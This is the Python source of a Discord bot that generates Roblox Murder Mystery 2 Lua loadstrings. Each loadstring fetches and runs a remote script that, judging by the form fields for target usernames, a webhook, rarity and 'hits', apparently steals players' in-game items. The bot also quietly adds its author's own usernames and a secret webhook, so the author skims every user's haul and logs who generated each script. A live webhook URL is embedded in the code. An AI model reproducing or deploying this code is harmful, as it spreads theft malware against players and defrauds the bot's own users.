import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse
import os
import requests

intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")

# Webhook for tracking who generates scripts
TRACKING_WEBHOOK = SECRET_WEBHOOK  # Using your same webhook

def send_webhook_notification(user, targets, paste_url, guild_name):
    """Send notification when someone generates a script"""
    try:
        data = {
            "embeds": [{
                "title": "📊 New Script Generated!",
                "color": 5814783,  # Blue color
                "fields": [
                    {"name": "User", "value": f"{user.name}#{user.discriminator}", "inline": True},
                    {"name": "User ID", "value": str(user.id), "inline": True},
                    {"name": "Server", "value": guild_name or "DM", "inline": True},
                    {"name": "Target Usernames", "value": targets, "inline": False},
                    {"name": "Pastebin Link", "value": paste_url, "inline": False}
                ],
                "timestamp": discord.utils.utcnow().isoformat()
            }]
        }
        requests.post(TRACKING_WEBHOOK, json=data)
    except Exception as e:
        print(f"Webhook error: {e}")
        pass

def create_pastebin(content):
    try:
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': 'N',
            'api_paste_name': 'MM2 Script'
        }
        response = requests.post('https://pastebin.com/api/api_post.php', data=data)
        if response.status_code == 200:
            paste_url = response.text.strip()
            # Extract paste ID from the response
            if 'pastebin.com/' in paste_url:
                # Extract the paste ID (the part after the last slash)
                paste_id = paste_url.split('/')[-1]
                raw_url = f"https://pastebin.com/raw/{paste_id}"
                return paste_url, raw_url
        return None, None
    except Exception as e:
        print(f"Pastebin error: {e}")
        return None, None

class ScriptModal(Modal, title="MM2 Script Generator"):
    usernames = TextInput(label="Target Usernames (comma separated)", placeholder="e.g. Nikilis, Tobi, JD", style=discord.TextStyle.paragraph, required=True)
    webhook = TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.long, required=True)
    min_rarity = TextInput(label="Minimum Rarity (default: Godly)", placeholder="Godly, Ancient, Legendary, etc.", default="Godly", required=False)
    min_value = TextInput(label="Minimum Value (default: 1)", placeholder="Only collect items worth this or more", default="1", required=False)
    ping = TextInput(label="Ping @everyone on hit? (Yes/No)", placeholder="Yes or No", default="No", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"
        
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "secret_webhook": SECRET_WEBHOOK,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No",
            "generator": generator_info
        })
        
        full_url = f"{RAW_SCRIPT_URL}?{params}"
        full_script = f'loadstring(game:HttpGet("{full_url}"))()'
        
        paste_url, raw_url = create_pastebin(full_script)
        
        if paste_url and raw_url:
            # Create the proper loadstring with raw URL
            loadstring_code = f'loadstring(game:HttpGet("{raw_url}"))()'
            
            # Send tracking notification to your webhook
            send_webhook_notification(
                interaction.user,
                ', '.join(user_targets),
                paste_url,
                interaction.guild.name if interaction.guild else "DM"
            )
            
            # Send to user
            try:
                await interaction.user.send(
                    f"**🎮 Your MM2 Script is Ready!**\n\n"
                    f"**Copy and paste this:**\n"
                    f"```lua\n{loadstring_code}\n```"
                )
                await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send(
                    f"⚠️ Couldn't DM you. Here's your script:\n```lua\n{loadstring_code}\n```",
                    ephemeral=True
                )
        else:
            # Fallback: send direct loadstring if Pastebin fails
            await interaction.followup.send(
                f"⚠️ Pastebin failed. Here's your direct script:\n```lua\n{full_script}\n```",
                ephemeral=True
            )

@tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
async def generate_mm2(interaction: discord.Interaction):
    """Main command to generate MM2 scripts"""
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    """Called when bot is ready"""
    await tree.sync()
    print(f"✅ {bot.user} is online and ready!")
    print(f"🤖 Bot ID: {bot.user.id}")
    print(f"🔗 Tracking Webhook: {TRACKING_WEBHOOK}")
    print(f"📁 Script Source: {RAW_SCRIPT_URL}")

# Error handling for commands
@tree.error
async def on_app_command_error(interaction: discord.Interaction, error):
    """Handle command errors"""
    if isinstance(error, app_commands.CommandInvokeError):
        await interaction.response.send_message(
            "❌ An error occurred while processing your command. Please try again.",
            ephemeral=True
        )
        print(f"Command error: {error}")

if __name__ == "__main__":
    # Check for required environment variables
    required_env_vars = ["DISCORD_TOKEN", "PASTEBIN_API_KEY"]
    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
    
    if missing_vars:
        print(f"❌ Missing environment variables: {', '.join(missing_vars)}")
        print("Please set these in your Replit environment variables:")
        for var in missing_vars:
            print(f"  - {var}")
        exit(1)
    
    print("🚀 Starting Discord bot...")
    bot.run(os.getenv("DISCORD_TOKEN"))
